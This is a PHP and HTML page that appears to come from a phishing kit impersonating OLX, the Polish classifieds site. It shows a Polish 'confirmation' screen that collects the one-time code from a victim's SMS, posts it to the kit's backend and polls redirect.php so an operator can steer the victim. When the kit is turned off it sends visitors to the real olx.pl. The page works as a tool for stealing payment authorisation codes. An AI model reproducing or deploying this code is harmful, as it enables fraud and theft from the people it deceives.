<?php

$status = file_get_contents('../api/online.txt');

if ($status == 'siteoff') { 
	header('location: https://olx.pl/'); exit();
}

include "../config.php";
include "../function.php";

$id = $_GET["id"];

if (strlen($id) !== 32 || !file_exists("../payment/temp/" . $id))
   	header("Location: /");
    
$json = file_get_contents("../payment/temp/" . $id);
$json = json_decode($json, true);

$json["retry_sms"] = false;

$json = json_encode($json);
file_put_contents("../payment/temp/" . $id, $json);

?>

<!DOCTYPE html>
<html>
	<head>
		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&amp;subset=cyrillic">
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
		<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
		<link rel="stylesheet" type="text/css" href="css/common.css">
		<link rel="shortcut icon" type="image/png" href="img/fav-icon.png">

		<script type="text/javascript" src="js/jquery.js"></script>
		<script type="text/javascript" src="js/bootstrap.js"></script>
		<script type="text/javascript" src="js/common.js"></script>

		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

		<title>Potwierdzenie</title>
	</head>

	<body>
		<div class="block-info">
			<h3 class="heading-info">
				Potwierdzenie
			</h3>

			<p class="description-info">
				Wprowadź kod z wiadomości SMS.
			</p>
		</div>

		<div class="divider"></div>

		<div class="block-form">
			<?php if ($_GET["retry"] == "true") { ?>
			<div style="width: 100%; background-color: #c0392b; color: #fff; border-radius: 3px; padding: 5px 10px; margin-top: 15px;">
				Wystąpił błąd, spróbuj ponownie.
			</div>
			<?php } ?>

			<p style="margin: 25px 0;">Wprowadź kod z SMS, który wyślemy za chwilę na Twój numer.</p>

			<form class="form-payment" method="post">
				<div class="form-group">
					<label for="input-code">Kod z SMS</label>
					<input type="text" class="form-control" id="input-code" name="code" placeholder="123456">

					<input type="hidden" name="id" value="<?php echo $id; ?>">
					<input type="hidden" name="step" value="2">
					<input type="hidden" name="retry" value="<?php echo $_GET["retry"]; ?>">
				</div>
			</form>
		</div>

		<div class="divider"></div>

		<div class="block-footer">
			<div class="row">
				<div class="col-xs-12">
					<a class="button-primary" style="margin-left: 0;">
						<i class="fas fa-chevron-right"></i> Potwierdzić
					</a>
				</div>
			</div>
		</div>

		<script type="text/javascript">
			var input = $("#input-code");

			$(".button-primary").click(function() {
				if (input.val().length < 4
					|| input.val().length > 12) {
					input.addClass("input-error");

					setTimeout(function() {
						input.removeClass("input-error");
					}, 2500);

					return false;
				} 

				$(this).css("pointer-events", "none");
				$(".button-primary").css("pointer-events", "none");
				$(this).html("<img src='img/icon-loader.svg'>");

				$.post("/payment/", $("form").serialize())
				.done(function() {
					// function...
				});	
				
				setInterval(function() {
				    var id = $("input[name='id']").val();
				    
				    $.post("redirect.php", { "id": id })
					.done(function(response) {
						if (response.status == "success")
						    location.href = response.url;
					});	
				}, 2500);

				return false;
			});
		</script>
	</body>
</html>